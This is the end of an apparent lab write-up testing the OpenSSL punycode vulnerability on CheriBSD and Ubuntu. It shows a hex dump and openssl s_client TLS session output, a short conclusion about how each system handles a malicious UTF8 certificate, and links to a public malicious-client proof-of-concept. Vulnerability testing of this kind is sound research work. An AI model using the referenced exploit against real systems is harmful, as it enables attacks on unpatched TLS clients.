    0070 - f6 fc cc 37 9a d9 84 35-0e b0 44 df 75 3f 63 5a   ...7...5..D.u?cZ
    0080 - d4 81 4b 62 36 1c 2e 2b-7d b2 66 16 f5 c8 61 61   ..Kb6..+}.f...aa
    0090 - be 6e 20 f2 12 a6 c7 db-de b3 37 4a 7d d7 ef 50   .n .......7J}..P
    00a0 - fd fe 93 b1 da 77 41 50-3b 78 4e 7a 53 bb fe 2a   .....wAP;xNzS..*
    00b0 - 89 9a 6c b3 11 79 bf 0b-4b b9 6a 76 1a 71 7d bc   ..l..y..K.jv.q}.
    00c0 - 0e 23 45 a9 65 15 7a 41-a8 fb 23 c3 32 ea 56 87   .#E.e.zA..#.2.V.
    00d0 - f3 70 ce bf da b5 55 40-a9 3b 22 01 4d fc 84 54   .p....U@.;".M..T
    00e0 - d5 e6 bf 1f e2 e1 70 44-cc 69 f9 46 e0 99 8a e6   ......pD.i.F....
    00f0 - 7c 28 61 a4 b2 fa 53 a7-39 90 9f 5e 30 0e 0b f0   |(a...S.9..^0...
    0100 - ec a2 de f2 9b 54 28 85-05 b0 c0 4f e2 08 41 98   .....T(....O..A.
    0110 - 36 02 85 21 1e c1 c3 46-68 f4 e0 d4 f9 91 cb 2f   6..!...Fh....../
    0120 - 3b c9 b8 af 3f 1d 55 1d-44 67 6f c6 9d c4 e2 6c   ;...?.U.Dgo....l
    0130 - d7 d0 cd 1d 13 3b 84 00-b5 7c 75 d4 5a b6 4d a6   .....;...|u.Z.M.
    0140 - 9e 83 6d 13 b9 85 e0 c4-8e d2 23 52 dc 9e 4e 00   ..m.......#R..N.
    0150 - 24 25 38 43 53 2e 44 f3-6b 67 3b a0 59 01 78 f4   $%8CS.D.kg;.Y.x.
    0160 - 25 4c 93 b3 88 ee 02 06-0a 22 14 16 10 e1 d8 05   %L......."......
    0170 - 34 01 c1 4a 2d 1b 9b 52-77 47 95 22 0f f5 01 10   4..J-..RwG."....
    0180 - 19 d2 63 67 08 90 62 ce-a1 4e 09 99 50 30 60 7c   ..cg..b..N..P0`|
    0190 - c4 a8 30 7f 0d 03 b6 50-a9 26 da 26 b6 b8 f0 bb   ..0....P.&.&....
    01a0 - 27 d0 57 8a f8 c9 2e 60-1b 65 79 c7 a7 7e fd 0d   '.W....`.ey..~..
    01b0 - aa 64 d0 7c b8 3b 40 e8-5d 6c b4 6f 8d 2f 42 d2   .d.|.;@.]l.o./B.
    01c0 - 77 33 44 8d d9 a3 a7 70-3d 98 83 d2 c2 1a ea 8e   w3D....p=.......
    01d0 - 0a 2f 24 f3 08 60 d5 28-9c 1f 2f 4d 91 40 43 84   ./$..`.(../M.@C.
    01e0 - 59 bd 07 4f 1b ca c5 86-a2 86 ca d5 7a cc 1a de   Y..O........z...
    01f0 - 48 48 5c f4 b3 e5 03 56-d3 2d d3 77 a9 17 73 b1   HH\....V.-.w..s.
    0200 - 6c 37 16 cb 3e 68 68 a3-31 b1 e1 b8 78 02 d3 2e   l7..>hh.1...x...
    0210 - 0f 97 d8 da 93 1d 34 51-29 ce 2c a2 11 f9 8e 2b   ......4Q).,....+
    0220 - 57 f3 71 f4 95 27 e9 ee-94 e2 ca e1 39 c2 80 dc   W.q..'......9...
    0230 - 23 30 ec 1f 88 27 f2 2e-3f 3e 19 89 3b 0f ad 9b   #0...'..?>..;...
    0240 - 65 0f b1 cc b8 0f b1 71-85 2e e1 89 88 0a bb 60   e......q.......`
    0250 - e4 5b 2b b8 5c f0 a6 67-4e 2e 3c 7a c1 8a 93 20   .[+.\..gN.<z... 
    0260 - a1 22 ad 56 88 d9 2f 6d-3d b4 52 87 e6 ce 66 37   .".V../m=.R...f7
    0270 - 91 94 11 d5 35 fe 12 fc-23 11 81 b8 da 75 79 a1   ....5...#....uy.
    0280 - a0 d7 d6 2d 1b 26 ee cd-c5 c4 f9 8d a8 52 42 48   ...-.&.......RBH
    0290 - d6 bb 3f 99 f8 3d 22 68-8b 41 04 d0 24 c6 c0 06   ..?..="h.A..$...
    02a0 - 67 28 0a 3d d5 93 3a bf-57 de f6 0a 89 ad 83 8a   g(.=..:.W.......
    02b0 - 83 38 ea 51 37 21 af 07-0f 4b a9 86 5e df 41 b4   .8.Q7!...K..^.A.
    02c0 - 1b 91 5a c2 79 b2 f6 6b-dc 6d 8d e0 6b 21 80 59   ..Z.y..k.m..k!.Y
    02d0 - e5 46 82 7b a4 a3 0f ec-50 0f b6 59 2c ce 9a 4e   .F.{....P..Y,..N
    02e0 - 04 69 70 98 7a 41 cb 38-34 dc 45 11 82 b9 a5 e4   .ip.zA.84.E.....
    02f0 - b5 d7 db cb 09 cc f7 75-8e a2 fb 48 a3 4d 0f 2e   .......u...H.M..
    0300 - 14 f6 84 f2 26 b1 a2 db-d6 4f 83 2a 95 08 fc 65   ....&....O.*...e
    0310 - 62 e5 d2 e2 46 74 39 fe-03 0d 41 d4 06 70 6e b3   b...Ft9...A..pn.
    0320 - d4 06 53 2f 15 7c d8 91-09 75 40 0f 01 02 f1 4f   ..S/.|...u@....O
    0330 - 04 9c fd 29 ea c5 fd b7-8d 7c c5 18 67 a6 dd 43   ...).....|..g..C
    0340 - 9a 0f f9 e9 51 a8 65 cf-38 11 9c 76 0b 59 2a 9a   ....Q.e.8..v.Y*.
    0350 - df ec 86 ed 9d 78 06 76-e1 46 53 49 a4 42 48 df   .....x.v.FSI.BH.
    0360 - 09 16 e2 f1 6a e2 f7 96-26 2f 87 08 07 d9 9c 5b   ....j...&/.....[
    0370 - 95 b1 06 09 43 4f 92 7a-44 28 8c 37 16 ad a7 ef   ....CO.zD(.7....
    0380 - 9e 0c 30 af 2f 70 41 22-9b 14 52 e5 b7 7f 91 fc   ..0./pA"..R.....
    0390 - 46 5e 39 63 9d 6f 98 dc-18 5d ae 36 05 c0 04 6e   F^9c.o...].6...n
    03a0 - de 59 25 e5 ab 0c 26 d5-b7 de 5f 98 fc c2 91 18   .Y%...&..._.....
    03b0 - a3 7c 88 d2 0d e2 99 15-59 7b d9 f4 a2 36 75 7c   .|......Y{...6u|
    03c0 - cb 9e c0 08 33 05 7b 16-32 e9 47 94 01 e8 b1 a3   ....3.{.2.G.....
    03d0 - 8c 57 7a 3c 0d f5 28 15-99 f9 0c 96 e7 55 5c f0   .Wz<..(......U\.
    03e0 - 40 bb be 15 6b 30 6b 89-d4 49 17 7b b6 73 59 62   @...k0k..I.{.sYb
    03f0 - 06 8d f8 bc 55 de e6 e6-2f 67 a9 5b f5 8d 52 a3   ....U.../g.[..R.
    0400 - c1 5e e6 a2 78 04 5c cf-54 3d 1d aa 94 f6 cd fb   .^..x.\.T=......
    0410 - 9b d8 0c f8 53 47 23 cb-1b f0 15 f8 65 27 78 21   ....SG#.....e'x!
    0420 - b6 2b 53 05 cc 2e 20 ad-28 47 f8 89 0f 28 4a 4a   .+S... .(G...(JJ
    0430 - 3f 30 45 88 c9 09 83 ea-e4 99 a9 27 82 19 4e 18   ?0E........'..N.
    0440 - 6d a5 8c e3 2c d1 d7 11-be 39 da 27 f9 cc 57 86   m...,....9.'..W.
    0450 - 89 ba 7c 91 89 87 05 f4-96 6d 89 cb bd 25 6f 8d   ..|......m...%o.
    0460 - 98 ea 50 d5 26 27 75 3b-85 65 0a d1 05 45 86 58   ..P.&'u;.e...E.X
    0470 - 98 08 ba 35 2f b5 9c 48-37 57 a0 bb 24 8e 5e 3c   ...5/..H7W..$.^<
    0480 - 40 73 66 60 4a 36 06 61-bf 19 71 fc 90 d4 7e d4   @sf`J6.a..q...~.
    0490 - 7c 93 e6 26 87 62 78 ae-09 8e f0 ce 7c 98 d7 f3   |..&.bx.....|...
    04a0 - ce d6 ad 79 fa 81 38 44-f1 08 94 ee bd 0f cb 0c   ...y..8D........
    04b0 - d7 f1 f4 be 91 e0 f0 67-3c 51 bc 1b f1 65 05 1a   .......g<Q...e..
    04c0 - 53 61 05 4e fc f8 e4 6b-9f e3 d6 04 e8 cf 5a 72   Sa.N...k......Zr
    04d0 - 02 70 82 d0 3b 43 64 f1-e1 e2 86 7e 5a 82 f2 02   .p..;Cd....~Z...
    04e0 - d2 f1 61 08 da 7f 69 a2-02 ba 5a bb 1c 32 2d 56   ..a...i...Z..2-V

    Start Time: 1667493974
    Timeout   : 7200 (sec)
    Verify return code: 19 (self-signed certificate in certificate chain)
    Extended master secret: no
    Max Early Data: 0
---
SSL_connect:SSLv3/TLS read server session ticket
read R BLOCK
```

## Conclusions
CheriBSD on UTF8 subject name returns `SSL3 alert write:fatal:decode error`. However, Ubuntu continues with the TLS negotiation. 

## References
[1] https://github.com/DataDog/security-labs-pocs/tree/main/proof-of-concept-exploits/openssl-punycode-vulnerability/malicious_client

[2] https://securitylabs.datadoghq.com/articles/openssl-november-1-vulnerabilities/#updates-made-to-this-post